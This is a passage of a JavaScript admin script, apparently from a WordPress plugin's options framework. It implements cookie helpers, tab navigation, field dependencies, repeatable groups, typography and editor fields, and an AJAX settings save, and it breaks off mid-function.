; (function ($, window, document, undefined) {
  'use strict';

  //
  // Constants
  //
  var SP_EAP = SP_EAP || {};

  SP_EAP.funcs = {};

  SP_EAP.vars = {
    onloaded: false,
    $body: $('body'),
    $window: $(window),
    $document: $(document),
    $form_warning: null,
    is_confirm: false,
    form_modified: false,
    code_themes: [],
    is_rtl: $('body').hasClass('rtl'),
  };

  //
  // Helper Functions
  //
  SP_EAP.helper = {

    //
    // Generate UID
    //
    uid: function (prefix) {
      return (prefix || '') + Math.random().toString(36).substr(2, 9);
    },

    // Quote regular expression characters
    //
    preg_quote: function (str) {
      return (str + '').replace(/(\[|\-|\])/g, "\\$1");
    },

    //
    // Reneme input names
    //
    name_nested_replace: function ($selector, field_id) {

      var checks = [];
      var regex = new RegExp('(' + SP_EAP.helper.preg_quote(field_id) + ')\\[(\\d+)\\]', 'g');

      $selector.find(':radio').each(function () {
        if (this.checked || this.orginal_checked) {
          this.orginal_checked = true;
        }
      });

      $selector.each(function (index) {
        $(this).find(':input').each(function () {
          this.name = this.name.replace(regex, field_id + '[' + index + ']');
          if (this.orginal_checked) {
            this.checked = true;
          }
        });
      });

    },

    //
    // Debounce
    //
    debounce: function (callback, threshold, immediate) {
      var timeout;
      return function () {
        var context = this, args = arguments;
        var later = function () {
          timeout = null;
          if (!immediate) {
            callback.apply(context, args);
          }
        };
        var callNow = (immediate && !timeout);
        clearTimeout(timeout);
        timeout = setTimeout(later, threshold);
        if (callNow) {
          callback.apply(context, args);
        }
      };
    },

    //
    // Get a cookie
    //
    get_cookie: function (name) {

      var e, b, cookie = document.cookie, p = name + '=';

      if (!cookie) {
        return;
      }

      b = cookie.indexOf('; ' + p);

      if (b === -1) {
        b = cookie.indexOf(p);

        if (b !== 0) {
          return null;
        }
      } else {
        b += 2;
      }

      e = cookie.indexOf(';', b);

      if (e === -1) {
        e = cookie.length;
      }

      return decodeURIComponent(cookie.substring(b + p.length, e));

    },

    //
    // Set a cookie
    //
    set_cookie: function (name, value, expires, path, domain, secure) {

      var d = new Date();

      if (typeof (expires) === 'object' && expires.toGMTString) {
        expires = expires.toGMTString();
      } else if (parseInt(expires, 10)) {
        d.setTime(d.getTime() + (parseInt(expires, 10) * 1000));
        expires = d.toGMTString();
      } else {
        expires = '';
      }

      document.cookie = name + '=' + encodeURIComponent(value) +
        (expires ? '; expires=' + expires : '') +
        (path ? '; path=' + path : '') +
        (domain ? '; domain=' + domain : '') +
        (secure ? '; secure' : '');

    },

    //
    // Remove a cookie
    //
    remove_cookie: function (name, path, domain, secure) {
      SP_EAP.helper.set_cookie(name, '', -1000, path, domain, secure);
    },

  };

  //
  // Custom clone for textarea and select clone() bug
  //
  $.fn.eapro_clone = function () {

    var base = $.fn.clone.apply(this, arguments),
      clone = this.find('select').add(this.filter('select')),
      cloned = base.find('select').add(base.filter('select'));

    for (var i = 0; i < clone.length; ++i) {
      for (var j = 0; j < clone[i].options.length; ++j) {

        if (clone[i].options[j].selected === true) {
          cloned[i].options[j].selected = true;
        }

      }
    }

    this.find(':radio').each(function () {
      this.orginal_checked = this.checked;
    });

    return base;

  };

  //
  // Expand All Options
  //
  $.fn.eapro_expand_all = function () {
    return this.each(function () {
      $(this).on('click', function (e) {

        e.preventDefault();
        $('.eapro-wrapper').toggleClass('eapro-show-all');
        $('.eapro-section').eapro_reload_script();
        $(this).find('.fa').toggleClass('fa-indent').toggleClass('fa-outdent');

      });
    });
  };

  //
  // Options Navigation
  //
  $.fn.eapro_nav_options = function () {
    return this.each(function () {

      var $nav = $(this),
        $links = $nav.find('a'),
        $hidden = $nav.closest('.eapro').find('.eapro-section-id'),
        $last_section;

      $(window).on('hashchange eapro.hashchange', function () {

        var hash = window.location.hash.match(new RegExp('tab=([^&]*)'));
        var slug = hash ? hash[1] : $links.first().attr('href').replace('#tab=', '');
        var $link = $('#eapro-tab-link-' + slug);

        if ($link.length > 0) {

          $link.closest('.eapro-tab-depth-0').addClass('eapro-tab-active').siblings().removeClass('eapro-tab-active');
          $links.removeClass('eapro-section-active');
          $link.addClass('eapro-section-active');

          if ($last_section !== undefined) {
            $last_section.hide();
          }

          var $section = $('#eapro-section-' + slug);
          $section.show();
          $section.eapro_reload_script();

          $hidden.val(slug);

          $last_section = $section;

        }

      }).trigger('eapro.hashchange');

    });
  };

  //
  // Metabox Tabs
  //
  $.fn.eapro_nav_metabox = function () {
    return this.each(function () {

      var $nav = $(this),
        $links = $nav.find('a'),
        unique_id = $nav.data('unique'),
        post_id = $('#post_ID').val() || 'global',
        $last_section,
        $last_link;

      $links.on('click', function (e) {

        e.preventDefault();

        var $link = $(this),
          section_id = $link.data('section');

        if ($last_link !== undefined) {
          $last_link.removeClass('eapro-section-active');
        }

        if ($last_section !== undefined) {
          $last_section.hide();
        }

        $link.addClass('eapro-section-active');

        var $section = $('#eapro-section-' + section_id);
        $section.show();
        $section.eapro_reload_script();

        SP_EAP.helper.set_cookie('eapro-last-metabox-tab-' + post_id + '-' + unique_id, section_id);

        $last_section = $section;
        $last_link = $link;

      });

      var get_cookie = SP_EAP.helper.get_cookie('eapro-last-metabox-tab-' + post_id + '-' + unique_id);

      if (get_cookie) {
        $nav.find('a[data-section="' + get_cookie + '"]').trigger('click');
      } else {
        $links.first('a').trigger('click');
      }

    });
  };

  //
  // Metabox Page Templates Listener
  //
  $.fn.eapro_page_templates = function () {
    if (this.length) {

      $(document).on('change', '.editor-page-attributes__template select, #page_template', function () {

        var maybe_value = $(this).val() || 'default';

        $('.eapro-page-templates').removeClass('eapro-show').addClass('eapro-hide');
        $('.eapro-page-' + maybe_value.toLowerCase().replace(/[^a-zA-Z0-9]+/g, '-')).removeClass('eapro-hide').addClass('eapro-show');

      });

    }
  };

  //
  // Metabox Post Formats Listener
  //
  $.fn.eapro_post_formats = function () {
    if (this.length) {

      $(document).on('change', '.editor-post-format select, #formatdiv input[name="post_format"]', function () {

        var maybe_value = $(this).val() || 'default';

        // Fallback for classic editor version
        maybe_value = (maybe_value === '0') ? 'default' : maybe_value;

        $('.eapro-post-formats').removeClass('eapro-show').addClass('eapro-hide');
        $('.eapro-post-format-' + maybe_value).removeClass('eapro-hide').addClass('eapro-show');

      });

    }
  };

  //
  // Search
  //
  $.fn.eapro_search = function () {
    return this.each(function () {

      var $this = $(this),
        $input = $this.find('input');

      $input.on('change keyup', function () {

        var value = $(this).val(),
          $wrapper = $('.eapro-wrapper'),
          $section = $wrapper.find('.eapro-section'),
          $fields = $section.find('> .eapro-field:not(.hidden)'),
          $titles = $fields.find('> .eapro-title, .eapro-search-tags');

        if (value.length > 2) {

          $fields.addClass('eapro-hidden');
          $wrapper.addClass('eapro-search-all');

          $titles.each(function () {

            var $title = $(this);

            if ($title.text().match(new RegExp('.*?' + value + '.*?', 'i'))) {

              var $field = $title.closest('.eapro-field');

              $field.removeClass('eapro-hidden');
              $field.parent().eapro_reload_script();

            }

          });

        } else {

          $fields.removeClass('eapro-hidden');
          $wrapper.removeClass('eapro-search-all');

        }

      });

    });
  };

  //
  // Sticky Header
  //
  $.fn.eapro_sticky = function () {
    return this.each(function () {

      var $this = $(this),
        $window = $(window),
        $inner = $this.find('.eapro-header-inner'),
        padding = parseInt($inner.css('padding-left')) + parseInt($inner.css('padding-right')),
        offset = 32,
        scrollTop = 0,
        lastTop = 0,
        ticking = false,
        stickyUpdate = function () {

          var offsetTop = $this.offset().top,
            stickyTop = Math.max(offset, offsetTop - scrollTop),
            winWidth = Math.max(document.documentElement.clientWidth, window.innerWidth || 0);

          if (stickyTop <= offset && winWidth > 782) {
            $inner.css({ width: $this.outerWidth() - padding });
            $this.css({ height: $this.outerHeight() }).addClass('eapro-sticky');
          } else {
            $inner.removeAttr('style');
            $this.removeAttr('style').removeClass('eapro-sticky');
          }

        },
        requestTick = function () {

          if (!ticking) {
            requestAnimationFrame(function () {
              stickyUpdate();
              ticking = false;
            });
          }

          ticking = true;

        },
        onSticky = function () {

          scrollTop = $window.scrollTop();
          requestTick();

        };

      $window.on('scroll resize', onSticky);

      onSticky();

    });
  };

  //
  // Dependency System
  //
  $.fn.eapro_dependency = function () {
    return this.each(function () {

      var $this = $(this),
        ruleset = $.eapro_deps.createRuleset(),
        depends = [],
        is_global = false;

      $this.children('[data-controller]').each(function () {

        var $field = $(this),
          controllers = $field.data('controller').split('|'),
          conditions = $field.data('condition').split('|'),
          values = $field.data('value').toString().split('|'),
          rules = ruleset;

        if ($field.data('depend-global')) {
          is_global = true;
        }

        $.each(controllers, function (index, depend_id) {

          var value = values[index] || '',
            condition = conditions[index] || conditions[0];

          rules = rules.createRule('[data-depend-id="' + depend_id + '"]', condition, value);

          rules.include($field);

          depends.push(depend_id);

        });

      });

      if (depends.length) {

        if (is_global) {
          $.eapro_deps.enable(SP_EAP.vars.$body, ruleset, depends);
        } else {
          $.eapro_deps.enable($this, ruleset, depends);
        }

      }

    });
  };


  //
  // Field: code_editor
  //
  $.fn.eapro_field_code_editor = function () {
    return this.each(function () {

      if (typeof CodeMirror !== 'function') { return; }

      var $this = $(this),
        $textarea = $this.find('textarea'),
        $inited = $this.find('.CodeMirror'),
        data_editor = $textarea.data('editor');

      if ($inited.length) {
        $inited.remove();
      }

      var interval = setInterval(function () {
        if ($this.is(':visible')) {

          var code_editor = CodeMirror.fromTextArea($textarea[0], data_editor);

          // load code-mirror theme css.
          if (data_editor.theme !== 'default' && SP_EAP.vars.code_themes.indexOf(data_editor.theme) === -1) {

            var $cssLink = $('<link>');

            $('#eapro-codemirror-css').after($cssLink);

            $cssLink.attr({
              rel: 'stylesheet',
              id: 'eapro-codemirror-' + data_editor.theme + '-css',
              href: data_editor.cdnURL + '/theme/' + data_editor.theme + '.min.css',
              type: 'text/css',
              media: 'all'
            });

            SP_EAP.vars.code_themes.push(data_editor.theme);

          }

          CodeMirror.modeURL = data_editor.cdnURL + '/mode/%N/%N.min.js';
          CodeMirror.autoLoadMode(code_editor, data_editor.mode);

          code_editor.on('change', function (editor, event) {
            $textarea.val(code_editor.getValue()).trigger('change');
          });

          clearInterval(interval);

        }
      });

    });
  };
  //
  // Field: group
  //
  $.fn.eapro_field_group = function () {
    return this.each(function () {

      var $this = $(this),
        $fieldset = $this.children('.eapro-fieldset'),
        $group = $fieldset.length ? $fieldset : $this,
        $wrapper = $group.children('.eapro-cloneable-wrapper'),
        $hidden = $group.children('.eapro-cloneable-hidden'),
        $max = $group.children('.eapro-cloneable-max'),
        $min = $group.children('.eapro-cloneable-min'),
        field_id = $wrapper.data('field-id'),
        unique_id = $wrapper.data('unique-id'),
        is_number = Boolean(Number($wrapper.data('title-number'))),
        max = parseInt($wrapper.data('max')),
        min = parseInt($wrapper.data('min'));

      // clear accordion arrows if multi-instance
      if ($wrapper.hasClass('ui-accordion')) {
        $wrapper.find('.ui-accordion-header-icon').remove();
      }

      var update_title_numbers = function ($selector) {
        $selector.find('.eapro-cloneable-title-number').each(function (index) {
          $(this).html(($(this).closest('.eapro-cloneable-item').index() + 1) + '.');
        });
      };

      $wrapper.accordion({
        header: '> .eapro-cloneable-item > .eapro-cloneable-title',
        collapsible: true,
        active: false,
        animate: false,
        heightStyle: 'content',
        icons: {
          'header': 'eapro-cloneable-header-icon fa fa-angle-right',
          'activeHeader': 'eapro-cloneable-header-icon fa fa-angle-down'
        },
        activate: function (event, ui) {

          var $panel = ui.newPanel;
          var $header = ui.newHeader;

          if ($panel.length && !$panel.data('opened')) {

            var $fields = $panel.children();
            var $first = $fields.first().find(':input').first();
            var $title = $header.find('.eapro-cloneable-value');

            $first.on('change keyup', function (event) {
              $title.text($first.val());
            });

            $panel.eapro_reload_script();
            $panel.data('opened', true);
            $panel.data('retry', false);

          } else if ($panel.data('retry')) {

            $panel.eapro_reload_script_retry();
            $panel.data('retry', false);

          }

        }
      });

      $wrapper.sortable({
        axis: 'y',
        handle: '.eapro-cloneable-title,.eapro-cloneable-sort',
        helper: 'original',
        cursor: 'move',
        placeholder: 'widget-placeholder',
        start: function (event, ui) {

          $wrapper.accordion({ active: false });
          $wrapper.sortable('refreshPositions');
          ui.item.children('.eapro-cloneable-content').data('retry', true);

        },
        update: function (event, ui) {

          SP_EAP.helper.name_nested_replace($wrapper.children('.eapro-cloneable-item'), field_id);
          $wrapper.eapro_customizer_refresh();

          if (is_number) {
            update_title_numbers($wrapper);
          }

        },
      });

      $group.children('.eapro-cloneable-add').on('click', function (e) {

        e.preventDefault();

        var count = $wrapper.children('.eapro-cloneable-item').length;

        $min.hide();

        if (max && (count + 1) > max) {
          $max.show();
          return;
        }

        var new_field_id = unique_id + field_id + '[' + count + ']';

        var $cloned_item = $hidden.eapro_clone(true);

        $cloned_item.removeClass('eapro-cloneable-hidden');

        $cloned_item.find(':input[name!="_pseudo"]').each(function () {
          this.name = new_field_id + this.name.replace((this.name.startsWith('_nonce') ? '_nonce' : unique_id), '');
        });

        $cloned_item.find('.eapro-data-wrapper').each(function () {
          $(this).attr('data-unique-id', new_field_id);
        });

        $wrapper.append($cloned_item);
        $wrapper.accordion('refresh');
        $wrapper.accordion({ active: count });
        $wrapper.eapro_customizer_refresh();
        $wrapper.eapro_customizer_listen({ closest: true });

        if (is_number) {
          update_title_numbers($wrapper);
        }

      });

      var event_clone = function (e) {

        e.preventDefault();

        var count = $wrapper.children('.eapro-cloneable-item').length;

        $min.hide();

        if (max && (count + 1) > max) {
          $max.show();
          return;
        }

        var $this = $(this),
          $parent = $this.parent().parent(),
          $cloned_helper = $parent.children('.eapro-cloneable-helper').eapro_clone(true),
          $cloned_title = $parent.children('.eapro-cloneable-title').eapro_clone(),
          $cloned_content = $parent.children('.eapro-cloneable-content').eapro_clone(),
          cloned_regex = new RegExp('(' + SP_EAP.helper.preg_quote(field_id) + ')\\[(\\d+)\\]', 'g');

        $cloned_content.find('.eapro-data-wrapper').each(function () {
          var $this = $(this);
          $this.attr('data-unique-id', $this.attr('data-unique-id').replace(cloned_regex, field_id + '[' + ($parent.index() + 1) + ']'));
        });

        var $cloned = $('<div class="eapro-cloneable-item" />');

        $cloned.append($cloned_helper);
        $cloned.append($cloned_title);
        $cloned.append($cloned_content);

        $wrapper.children().eq($parent.index()).after($cloned);

        SP_EAP.helper.name_nested_replace($wrapper.children('.eapro-cloneable-item'), field_id);

        $wrapper.accordion('refresh');
        $wrapper.eapro_customizer_refresh();
        $wrapper.eapro_customizer_listen({ closest: true });

        if (is_number) {
          update_title_numbers($wrapper);
        }

      };

      $wrapper.children('.eapro-cloneable-item').children('.eapro-cloneable-helper').on('click', '.eapro-cloneable-clone', event_clone);
      $group.children('.eapro-cloneable-hidden').children('.eapro-cloneable-helper').on('click', '.eapro-cloneable-clone', event_clone);

      var event_remove = function (e) {

        e.preventDefault();

        var count = $wrapper.children('.eapro-cloneable-item').length;

        $max.hide();
        $min.hide();

        if (min && (count - 1) < min) {
          $min.show();
          return;
        }

        $(this).closest('.eapro-cloneable-item').remove();

        SP_EAP.helper.name_nested_replace($wrapper.children('.eapro-cloneable-item'), field_id);

        $wrapper.eapro_customizer_refresh();

        if (is_number) {
          update_title_numbers($wrapper);
        }

      };

      $wrapper.children('.eapro-cloneable-item').children('.eapro-cloneable-helper').on('click', '.eapro-cloneable-remove', event_remove);
      $group.children('.eapro-cloneable-hidden').children('.eapro-cloneable-helper').on('click', '.eapro-cloneable-remove', event_remove);

    });
  };

  //
  // Field: spinner
  //
  $.fn.eapro_field_spinner = function () {
    return this.each(function () {

      var $this = $(this),
        $input = $this.find('input'),
        $inited = $this.find('.ui-spinner-button'),
        $unit = $input.data('unit');

      if ($inited.length) {
        $inited.remove();
      }

      $input.spinner({
        max: $input.data('max') || 100,
        min: $input.data('min') || 0,
        step: $input.data('step') || 1,
        create: function (event, ui) {
          if ($unit.length) {
            $this.find('.ui-spinner-up').after('<span class="ui-button-text-only eapro--unit">' + $unit + '</span>');
          }
        },
        spin: function (event, ui) {
          $input.val(ui.value).trigger('change');
        }
      });

    });
  };

  //
  // Field: switcher
  //
  $.fn.eapro_field_switcher = function () {
    return this.each(function () {

      var $switcher = $(this).find('.eapro--switcher');

      $switcher.on('click', function () {

        var value = 0;
        var $input = $switcher.find('input');

        if ($switcher.hasClass('eapro--active')) {
          $switcher.removeClass('eapro--active');
        } else {
          value = 1;
          $switcher.addClass('eapro--active');
        }

        $input.val(value).trigger('change');

      });

    });
  };

  //
  // Field: typography
  //
  $.fn.eapro_field_typography = function () {
    return this.each(function () {

      var base = this;
      var $this = $(this);
      var loaded_fonts = [];
      var webfonts = eapro_typography_json.webfonts;
      var googlestyles = eapro_typography_json.googlestyles;
      var defaultstyles = eapro_typography_json.defaultstyles;

      //
      //
      // Sanitize google font subset
      base.sanitize_subset = function (subset) {
        subset = subset.replace('-ext', ' Extended');
        subset = subset.charAt(0).toUpperCase() + subset.slice(1);
        return subset;
      };

      //
      //
      // Sanitize google font styles (weight and style)
      base.sanitize_style = function (style) {
        return googlestyles[style] ? googlestyles[style] : style;
      };

      //
      //
      // Load google font
      base.load_google_font = function (font_family, weight, style) {

        if (font_family && typeof WebFont === 'object') {

          weight = weight ? weight.replace('normal', '') : '';
          style = style ? style.replace('normal', '') : '';

          if (weight || style) {
            font_family = font_family + ':' + weight + style;
          }

          if (loaded_fonts.indexOf(font_family) === -1) {
            WebFont.load({ google: { families: [font_family] } });
          }

          loaded_fonts.push(font_family);

        }

      };

      //
      //
      // Append select options
      base.append_select_options = function ($select, options, condition, type, is_multi) {

        $select.find('option').not(':first').remove();

        var opts = '';

        $.each(options, function (key, value) {

          var selected;
          var name = value;

          // is_multi
          if (is_multi) {
            selected = (condition && condition.indexOf(value) !== -1) ? ' selected' : '';
          } else {
            selected = (condition && condition === value) ? ' selected' : '';
          }

          if (type === 'subset') {
            name = base.sanitize_subset(value);
          } else if (type === 'style') {
            name = base.sanitize_style(value);
          }

          opts += '<option value="' + value + '"' + selected + '>' + name + '</option>';

        });

        $select.append(opts).trigger('eapro.change').trigger('chosen:updated');

      };

      base.init = function () {

        //
        //
        // Constants
        var selected_styles = [];
        var $typography = $this.find('.eapro--typography');
        var $type = $this.find('.eapro--type');
        var $styles = $this.find('.eapro--block-font-style');
        var unit = $typography.data('unit');
        var line_height_unit = $typography.data('line-height-unit');
        var exclude_fonts = $typography.data('exclude') ? $typography.data('exclude').split(',') : [];

        //
        //
        // Chosen init
        if ($this.find('.eapro--chosen').length) {

          var $chosen_selects = $this.find('select');

          $chosen_selects.each(function () {

            var $chosen_select = $(this),
              $chosen_inited = $chosen_select.parent().find('.chosen-container');

            if ($chosen_inited.length) {
              $chosen_inited.remove();
            }

            $chosen_select.chosen({
              allow_single_deselect: true,
              disable_search_threshold: 15,
              width: '100%'
            });

          });

        }

        //
        //
        // Font family select
        var $font_family_select = $this.find('.eapro--font-family');
        var first_font_family = $font_family_select.val();

        // Clear default font family select options
        $font_family_select.find('option').not(':first-child').remove();

        var opts = '';

        $.each(webfonts, function (type, group) {

          // Check for exclude fonts
          if (exclude_fonts && exclude_fonts.indexOf(type) !== -1) { return; }

          opts += '<optgroup label="' + group.label + '">';

          $.each(group.fonts, function (key, value) {

            // use key if value is object
            value = (typeof value === 'object') ? key : value;
            var selected = (value === first_font_family) ? ' selected' : '';
            opts += '<option value="' + value + '" data-type="' + type + '"' + selected + '>' + value + '</option>';

          });

          opts += '</optgroup>';

        });

        // Append google font select options
        $font_family_select.append(opts).trigger('chosen:updated');

        //
        //
        // Font style select
        var $font_style_block = $this.find('.eapro--block-font-style');

        if ($font_style_block.length) {

          var $font_style_select = $this.find('.eapro--font-style-select');
          var first_style_value = $font_style_select.val() ? $font_style_select.val().replace(/normal/g, '') : '';

          //
          // Font Style on on change listener
          $font_style_select.on('change eapro.change', function (event) {

            var style_value = $font_style_select.val();

            // set a default value
            if (!style_value && selected_styles && selected_styles.indexOf('normal') === -1) {
              style_value = selected_styles[0];
            }

            // set font weight, for eg. replacing 800italic to 800
            var font_normal = (style_value && style_value !== 'italic' && style_value === 'normal') ? 'normal' : '';
            var font_weight = (style_value && style_value !== 'italic' && style_value !== 'normal') ? style_value.replace('italic', '') : font_normal;
            var font_style = (style_value && style_value.substr(-6) === 'italic') ? 'italic' : '';

            $this.find('.eapro--font-weight').val(font_weight);
            $this.find('.eapro--font-style').val(font_style);

          });

          //
          //
          // Extra font style select
          var $extra_font_style_block = $this.find('.eapro--block-extra-styles');

          if ($extra_font_style_block.length) {
            var $extra_font_style_select = $this.find('.eapro--extra-styles');
            var first_extra_style_value = $extra_font_style_select.val();
          }

        }

        //
        //
        // Subsets select
        var $subset_block = $this.find('.eapro--block-subset');
        if ($subset_block.length) {
          var $subset_select = $this.find('.eapro--subset');
          var first_subset_select_value = $subset_select.val();
          var subset_multi_select = $subset_select.data('multiple') || false;
        }

        //
        //
        // Backup font family
        var $backup_font_family_block = $this.find('.eapro--block-backup-font-family');

        //
        //
        // Font Family on Change Listener
        $font_family_select.on('change eapro.change', function (event) {

          // Hide subsets on change
          if ($subset_block.length) {
            $subset_block.addClass('hidden');
          }

          // Hide extra font style on change
          if ($extra_font_style_block.length) {
            $extra_font_style_block.addClass('hidden');
          }

          // Hide backup font family on change
          if ($backup_font_family_block.length) {
            $backup_font_family_block.addClass('hidden');
          }

          var $selected = $font_family_select.find(':selected');
          var value = $selected.val();
          var type = $selected.data('type');

          if (type && value) {

            // Show backup fonts if font type google or custom
            if ((type === 'google' || type === 'custom') && $backup_font_family_block.length) {
              $backup_font_family_block.removeClass('hidden');
            }

            // Appending font style select options
            if ($font_style_block.length) {

              // set styles for multi and normal style selectors
              var styles = defaultstyles;

              // Custom or gogle font styles
              if (type === 'google' && webfonts[type].fonts[value][0]) {
                styles = webfonts[type].fonts[value][0];
              } else if (type === 'custom' && webfonts[type].fonts[value]) {
                styles = webfonts[type].fonts[value];
              }

              selected_styles = styles;

              // Set selected style value for avoid load errors
              var set_auto_style = (styles.indexOf('normal') !== -1) ? 'normal' : styles[0];
              var set_style_value = (first_style_value && styles.indexOf(first_style_value) !== -1) ? first_style_value : set_auto_style;

              // Append style select options
              base.append_select_options($font_style_select, styles, set_style_value, 'style');

              // Clear first value
              first_style_value = false;

              // Show style select after appended
              $font_style_block.removeClass('hidden');

              // Appending extra font style select options
              if (type === 'google' && $extra_font_style_block.length && styles.length > 1) {

                // Append extra-style select options
                base.append_select_options($extra_font_style_select, styles, first_extra_style_value, 'style', true);

                // Clear first value
                first_extra_style_value = false;

                // Show style select after appended
                $extra_font_style_block.removeClass('hidden');

              }

            }

            // Appending google fonts subsets select options
            if (type === 'google' && $subset_block.length && webfonts[type].fonts[value][1]) {

              var subsets = webfonts[type].fonts[value][1];
              var set_auto_subset = (subsets.length < 2 && subsets[0] !== 'latin') ? subsets[0] : '';
              var set_subset_value = (first_subset_select_value && subsets.indexOf(first_subset_select_value) !== -1) ? first_subset_select_value : set_auto_subset;

              // check for multiple subset select
              set_subset_value = (subset_multi_select && first_subset_select_value) ? first_subset_select_value : set_subset_value;

              base.append_select_options($subset_select, subsets, set_subset_value, 'subset', subset_multi_select);

              first_subset_select_value = false;

              $subset_block.removeClass('hidden');

            }

          } else {

            // Clear Styles
            $styles.find(':input').val('');

            // Clear subsets options if type and value empty
            if ($subset_block.length) {
              $subset_select.find('option').not(':first-child').remove();
              $subset_select.trigger('chosen:updated');
            }

            // Clear font styles options if type and value empty
            if ($font_style_block.length) {
              $font_style_select.find('option').not(':first-child').remove();
              $font_style_select.trigger('chosen:updated');
            }

          }

          // Update font type input value
          $type.val(type);

        }).trigger('eapro.change');

        //
        //
        // Preview
        var $preview_block = $this.find('.eapro--block-preview');

        if ($preview_block.length) {

          var $preview = $this.find('.eapro--preview');

          // Set preview styles on change
          $this.on('change', SP_EAP.helper.debounce(function (event) {

            $preview_block.removeClass('hidden');

            var font_family = $font_family_select.val(),
              font_weight = $this.find('.eapro--font-weight').val(),
              font_style = $this.find('.eapro--font-style').val(),
              font_size = $this.find('.eapro--font-size').val(),
              font_variant = $this.find('.eapro--font-variant').val(),
              line_height = $this.find('.eapro--line-height').val(),
              text_align = $this.find('.eapro--text-align').val(),
              text_transform = $this.find('.eapro--text-transform').val(),
              text_decoration = $this.find('.eapro--text-decoration').val(),
              text_color = $this.find('.eapro--color').val(),
              word_spacing = $this.find('.eapro--word-spacing').val(),
              letter_spacing = $this.find('.eapro--letter-spacing').val(),
              custom_style = $this.find('.eapro--custom-style').val(),
              type = $this.find('.eapro--type').val();

            if (type === 'google') {
              base.load_google_font(font_family, font_weight, font_style);
            }

            var properties = {};

            if (font_family) { properties.fontFamily = font_family; }
            if (font_weight) { properties.fontWeight = font_weight; }
            if (font_style) { properties.fontStyle = font_style; }
            if (font_variant) { properties.fontVariant = font_variant; }
            if (font_size) { properties.fontSize = font_size + unit; }
            if (line_height) { properties.lineHeight = line_height + line_height_unit; }
            if (letter_spacing) { properties.letterSpacing = letter_spacing + unit; }
            if (word_spacing) { properties.wordSpacing = word_spacing + unit; }
            if (text_align) { properties.textAlign = text_align; }
            if (text_transform) { properties.textTransform = text_transform; }
            if (text_decoration) { properties.textDecoration = text_decoration; }
            if (text_color) { properties.color = text_color; }

            $preview.removeAttr('style');

            // Customs style attribute
            if (custom_style) { $preview.attr('style', custom_style); }

            $preview.css(properties);

          }, 100));

          // Preview black and white backgrounds trigger
          $preview_block.on('click', function () {

            $preview.toggleClass('eapro--black-background');

            var $toggle = $preview_block.find('.eapro--toggle');

            if ($toggle.hasClass('fa-toggle-off')) {
              $toggle.removeClass('fa-toggle-off').addClass('fa-toggle-on');
            } else {
              $toggle.removeClass('fa-toggle-on').addClass('fa-toggle-off');
            }

          });

          if (!$preview_block.hasClass('hidden')) {
            $this.trigger('change');
          }

        }

      };

      base.init();

    });
  };

  //
  // Field: wp_editor
  //
  $.fn.eapro_field_wp_editor = function () {
    return this.each(function () {

      if (typeof window.wp.editor === 'undefined' || typeof window.tinyMCEPreInit === 'undefined' || typeof window.tinyMCEPreInit.mceInit.eapro_wp_editor === 'undefined') {
        return;
      }

      var $this = $(this),
        $editor = $this.find('.eapro-wp-editor'),
        $textarea = $this.find('textarea');

      // If there is wp-editor remove it for avoid dupliated wp-editor conflicts.
      var $has_wp_editor = $this.find('.wp-editor-wrap').length || $this.find('.mce-container').length;

      if ($has_wp_editor) {
        $editor.empty();
        $editor.append($textarea);
        $textarea.css('display', '');
      }

      // Generate a unique id
      var uid = SP_EAP.helper.uid('eapro-editor-');

      $textarea.attr('id', uid);

      // Get default editor settings
      var default_editor_settings = {
        tinymce: window.tinyMCEPreInit.mceInit.eapro_wp_editor,
        quicktags: window.tinyMCEPreInit.qtInit.eapro_wp_editor
      };

      // Get default editor settings
      var field_editor_settings = $editor.data('editor-settings');

      // Add on change event handle
      var editor_on_change = function (editor) {
        editor.on('change', SP_EAP.helper.debounce(function () {
          editor.save();
          $textarea.trigger('change');
        }, 250));
      };

      // Callback for old wp editor
      var wpEditor = wp.oldEditor ? wp.oldEditor : wp.editor;

      if (wpEditor && wpEditor.hasOwnProperty('autop')) {
        wp.editor.autop = wpEditor.autop;
        wp.editor.removep = wpEditor.removep;
        wp.editor.initialize = wpEditor.initialize;
      }

      // Extend editor selector and on change event handler
      default_editor_settings.tinymce = $.extend({}, default_editor_settings.tinymce, { selector: '#' + uid, setup: editor_on_change });

      // Override editor tinymce settings
      if (field_editor_settings.tinymce === false) {
        default_editor_settings.tinymce = false;
        $editor.addClass('eapro-no-tinymce');
      }

      // Override editor quicktags settings
      if (field_editor_settings.quicktags === false) {
        default_editor_settings.quicktags = false;
        $editor.addClass('eapro-no-quicktags');
      }

      // Wait until :visible
      var interval = setInterval(function () {
        if ($this.is(':visible')) {
          window.wp.editor.initialize(uid, default_editor_settings);
          clearInterval(interval);
        }
      });

      // Add Media buttons
      if (field_editor_settings.media_buttons && window.eapro_media_buttons) {

        var $editor_buttons = $editor.find('.wp-media-buttons');

        if ($editor_buttons.length) {

          $editor_buttons.find('.eapro-shortcode-button').data('editor-id', uid);

        } else {

          var $media_buttons = $(window.eapro_media_buttons);

          $media_buttons.find('.eapro-shortcode-button').data('editor-id', uid);

          $editor.prepend($media_buttons);

        }

      }

    });

  };

  //
  // Confirm
  //
  $.fn.eapro_confirm = function () {
    return this.each(function () {
      $(this).on('click', function (e) {

        var confirm_text = $(this).data('confirm') || window.eapro_vars.i18n.confirm;
        var confirm_answer = confirm(confirm_text);

        if (confirm_answer) {
          SP_EAP.vars.is_confirm = true;
        } else {
          e.preventDefault();
          return false;
        }

      });
    });
  };

  $.fn.serializeObject = function () {

    var obj = {};

    $.each(this.serializeArray(), function (i, o) {
      var n = o.name,
        v = o.value;

      obj[n] = obj[n] === undefined ? v
        : $.isArray(obj[n]) ? obj[n].concat(v)
          : [obj[n], v];
    });

    return obj;

  };

  //
  // Options Save
  //
  $.fn.eapro_save = function () {
    return this.each(function () {

      var $this = $(this),
        $buttons = $('.eapro-save'),
        $panel = $('.eapro-options'),
        flooding = false,
        timeout;

      $this.on('click', function (e) {

        if (!flooding) {

          var $text = $this.data('save'),
            $value = $this.val();

          $buttons.attr('value', $text);

          if ($this.hasClass('eapro-save-ajax')) {

            e.preventDefault();

            $panel.addClass('eapro-saving');
            $buttons.prop('disabled', true);

            window.wp.ajax.post('eapro_' + $panel.data('unique') + '_ajax_save', {
              data: $('#eapro-form').serializeJSONSP_EAP()
            })
              .done(function (response) {

                // clear errors
                $('.eapro-error').remove();

                if (Object.keys(response.errors).length) {

                  var error_icon = '<i class="eapro-label-error eapro-error">!</i>';

                  $.each(response.errors, function (key, error_message) {

                    var $field = $('[data-depend-id="' + key + '"]'),
                      $link = $('#eapro-tab-link-' + ($field.closest('.eapro-section').index() + 1)),
                      $tab = $link.closest('.eapro-tab-depth-0');

